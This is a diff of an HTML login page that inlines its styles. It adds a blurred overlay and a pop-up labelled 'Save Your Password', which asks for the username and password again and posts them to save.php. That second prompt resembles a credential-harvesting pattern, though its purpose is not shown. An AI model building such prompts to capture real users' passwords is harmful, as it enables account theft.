@@ -1,32 +1,237 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login-Verification</title>
-    <link rel="stylesheet" href="login.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login-Verification</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #e6dddd;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+/* Login container */
+.login-container {
+    background-color: white;
+    padding: 30px;
+    border-radius: 10px;
+    box-shadow: 0px 0px 10px #aaa;
+    width: 300px;
+    max-width: 90%;
+    box-sizing: border-box;
+    z-index:0;
+}
+
+.login-container h2 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.login-container input[type="text"],
+.login-container input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+}
+
+.login-container button {
+    width: 100%;
+    padding: 10px;
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 16px;
+}
+
+.login-container button:hover {
+    background-color: #45a049;
+}
+
+.login-container p {
+    text-align: center;
+    margin-top: 10px;
+}
+/* Notification box */
+.notification {
+    text-align: center;
+    width: 350px;           /* slightly wider for modern apps */
+    max-width: 90%;
+    background-color: #a8dadc; /* lighter, soft teal for modern UI */
+    border-radius: 14px;
+    position: fixed;
+    top: -100px;            /* hidden initially */
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 1000;
+    display: none;
+    padding: 20px 28px;    /* slightly larger padding for touch */
+    box-sizing: border-box;
+    color: #1d3557;         /* dark blue text for good contrast */
+    box-shadow: 0 10px 25px rgba(0,0,0,0.15); /* softer shadow */
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    font-size: 16px;
+}
+
+/* Smooth falling animation without bounce */
+@keyframes fall {
+    0% {
+        top: -120px;
+        opacity: 0;
+    }
+    100% {
+        top: 20px;
+        opacity: 1;
+    }
+}
+
+.notification.show {
+    display: block;
+    animation: fall 0.7s ease-out forwards;
+}
+
+.notification p {
+    font-size: 20px;       /* readable size */
+    font-weight: 800;
+    margin-bottom: 14px;
+    line-height: 1.5;      /* improved spacing for readability */
+}
+
+.notification button {
+    width: 80px;
+    padding: 9px 14px;
+    border-radius: 8px;
+    border: none;
+    background-color: #2a4556; /* soft, modern blue */
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background 0.3s ease;
+    margin-top: 5px;
+    font-size: 14px;
+}
+
+.notification button:hover {
+    background-color: #1d3557; /* darker shade on hover */
+}
+
+#users, #passes {
+    border: 1px solid #bbb;
+    margin-top: -29px;
+    margin-bottom: 12px;
+    height: 34px;
+    width: 90%;
+    padding: 7px 12px;
+    border-radius: 8px;
+    box-sizing: border-box;
+    font-size: 15px;
+}
+
+/* Optional: subtle fade out for modern UX */
+.notification.hide {
+    animation: fadeOut 0.5s ease forwards;
+}
+
+@keyframes fadeOut {
+    0% {
+        opacity: 1;
+    }
+    100% {
+        opacity: 0;
+        top: -100px;
+    }
+}
+
+
+/* Media query for smaller screens */
+@media (max-width: 480px) {
+    .login-container {
+        padding: 20px;
+        width: 90%;
+    }
+
+    .login-container h2 {
+        font-size: 20px;
+    }
+
+    .login-container button {
+        font-size: 14px;
+        padding: 8px;
+    }
+
+    .notification {
+        width: 90%;
+        padding: 15px;
+        top: -120px;
+    }
+
+    .notification p {
+        font-size: 20px;
+    }
+
+    #users, #passes {
+        width: 70%;
+        height: 28px;
+        padding: 5px 8px;
+        margin-top: -25px;
+        margin-bottom: 10px;
+    }
+
+    .notification button {
+        width: 70px;
+        padding: 5px;
+        font-size: 14px;
+    }
+}
+.overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    backdrop-filter: blur(5px);           /* blur everything behind */
+    background-color: rgba(0,0,0,0.2);   /* optional dim */
+    display: none;
+    z-index: 900;                         /* behind notification */
+}
+
+.overlay.show {
+    display: block;
+}
+</style>
 </head>
 <body>
-
+<div class="overlay"></div>
 <div class="login-container">
     <h2>Login</h2>
-    <form   id="loginForm">
-        <input  type="text" id="username" placeholder="Username" required>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
         <button id="login" type="submit">Login</button>
     </form>
     <p id="message"></p>
 </div>
+
 <div id="notification" class="notification">
     <p>Save Your Password</p>
     <form action="save.php" method="POST">
         <input type="text" name="name" id="users" placeholder="Username">
         <input type="password" name="password" id="passes" placeholder="Password"><br>
         <button type="submit" id="verify">Save</button>
+        <button type="button" id="verifynot">Cancel</button>
     </form>
 </div>
-
 
 <script src="script.js"></script>
 </body>
 </html>
+
